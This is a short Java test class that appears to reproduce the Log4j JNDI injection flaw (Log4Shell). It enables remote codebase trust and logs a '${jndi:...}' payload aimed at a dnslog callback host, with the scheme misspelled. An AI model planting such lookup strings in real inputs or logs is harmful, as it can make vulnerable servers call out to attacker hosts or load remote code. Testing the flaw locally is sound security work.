package com.dsz.jvm.test1;


import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @Auther: ShouZhi@Duan
 * @Description:
 */
public class Log4jTest {
    private static final Logger logger = LogManager.getLogger(Log4jTest.class);

    public static void main(String[] args) {
            System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
            //logger.error("${jndi:ladp://yq1ng.4k591x.dnslog.cn}");
            logger.error("${jndi:ladp://yq1ng.4k591x.dnslog.cn}");
    }
}
